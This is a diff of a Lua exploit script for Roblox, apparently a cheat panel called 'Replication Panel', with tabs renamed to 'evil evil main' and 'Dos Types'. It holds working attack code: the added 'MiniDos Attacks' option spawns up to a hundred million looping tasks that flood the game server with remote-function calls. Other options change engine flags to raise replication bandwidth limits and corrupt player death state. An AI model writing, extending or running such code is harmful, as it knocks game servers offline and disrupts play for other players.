@@ -9,13 +9,15 @@ Subtitle = "Replication Panel",
 Size = UDim2.fromOffset(620, 390)
 })
 
-local tab1 = W:Tab("Replication")
+local tab1 = W:Tab("evil evil main")
+local tab2 = W:Tab("Discontuinued")
+local tab3 = W:Tab("Dos Types")
 
-tab1:Option("Make Death State Corrupted (WIP doesnt work yet)", function()
+tab2:Option("Make Death State Corrupted (WIP doesnt work yet)", function()
 warn()
 end)
 
-tab1:Option("Corrupt Death State", function()
+tab2:Option("Corrupt Death State", function()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -105,18 +107,22 @@ game:DefineFastInt("NextGenerationReplicationBandwidthLimit", "1000000000")
 game:DefineFastFlag("EnableNextGenerationReplication", true)
 end)
 
-tab1:Option("Server Replication Lag = yes", function()
+tab3:Option("MiniDos Attacks", function()
 local s = game:GetService("RobloxReplicatedStorage")
 local r1 = s:FindFirstChild("GetServerVersion")
 local r2 = s:FindFirstChild("GetServerType")
 local r3 = s:FindFirstChild("GetServerChannel")
 
-for i = 1, 2000 do
+for i = 1, 100 do
+task.spawn(function()
+for i = 1, 1000000 do
 task.spawn(function()
 while task.wait() do
 r1:InvokeServer()
 r2:InvokeServer()
 r3:InvokeServer()
+end
+end)
 end
 end)
 end
